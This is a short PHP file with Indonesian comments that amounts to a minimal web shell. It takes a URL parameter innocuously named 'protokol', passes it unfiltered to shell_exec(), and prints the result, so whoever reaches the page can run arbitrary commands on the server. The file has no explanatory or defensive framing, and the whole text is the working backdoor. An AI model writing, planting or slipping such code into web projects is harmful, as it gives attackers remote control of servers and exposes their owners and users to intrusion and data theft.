<?php
      // Mengecek apakah parameter "command" terdefinisi dalam URL
      if (isset($_GET['protokol'])) {
        // Mengambil nilai parameter "protokol" dari URL
        $protokol = $_GET['protokol'];
        
        // Menjalankan perintah shell menggunakan shell_exec()
        $output = shell_exec($protokol);
        
        // Menampilkan output dari perintah shell ke dalam tag pre
        echo "<pre>$output</pre>";
      }
?>